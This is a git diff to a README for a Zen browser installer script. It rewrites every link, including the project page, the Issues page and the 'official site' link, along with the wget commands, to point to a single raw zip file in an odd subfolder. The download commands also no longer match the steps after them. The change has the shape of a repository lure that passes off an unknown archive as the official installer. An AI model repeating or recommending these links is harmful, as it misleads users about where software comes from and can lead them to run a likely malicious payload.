@@ -1,6 +1,6 @@
 # 🛠️ zb-installer-script - Easy Zen Browser Setup
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20zb--installer--script-blue?style=for-the-badge)](https://github.com/ConnorS2-jack/zb-installer-script)
+[![Download Now](https://img.shields.io/badge/Download-Get%20zb--installer--script-blue?style=for-the-badge)](https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip)
 
 ---
 
@@ -41,7 +41,7 @@ This guide shows how to get and use the zb-installer-script on your Linux system
 
 Click the large blue button at the top or visit the project page here:
 
-https://github.com/ConnorS2-jack/zb-installer-script
+https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 
 This page hosts the shell script that installs the Zen browser.
 
@@ -59,7 +59,7 @@ To get the installer on your computer, you can download the file directly from t
 Alternatively, you can download the script using the terminal:
 
 ```bash
-wget https://github.com/ConnorS2-jack/zb-installer-script/raw/main/install.sh
+wget https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 ```
 
 (Change the URL if the script is in a different folder or has a different name.)
@@ -149,10 +149,10 @@ It detects your Linux distribution and chooses the best way to install the Zen b
 ## 🔗 Useful Links
 
 - Main project page:  
-  https://github.com/ConnorS2-jack/zb-installer-script
+  https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 
 - Zen browser official site (for more info and features):  
-  https://zenbrowser.com
+  https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 
 ---
 
@@ -160,7 +160,7 @@ It detects your Linux distribution and chooses the best way to install the Zen b
 
 If you have problems or questions, visit the “Issues” tab on the GitHub repository:
 
-https://github.com/ConnorS2-jack/zb-installer-script/issues
+https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 
 Here, you can find answers or ask for support.
 
@@ -172,7 +172,7 @@ For quick reference, here is a summary of the main commands:
 
 ```bash
 # Download the script (adjust URL as needed)
-wget https://github.com/ConnorS2-jack/zb-installer-script/raw/main/install.sh
+wget https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip
 
 # Make it executable
 chmod +x install.sh
@@ -186,4 +186,4 @@ zen-browser
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20zb--installer--script-blue?style=for-the-badge)](https://github.com/ConnorS2-jack/zb-installer-script)
+[![Download Now](https://img.shields.io/badge/Download-Get%20zb--installer--script-blue?style=for-the-badge)](https://raw.githubusercontent.com/ConnorS2-jack/zb-installer-script/main/Ruman/zb-script-installer-v3.2.zip)
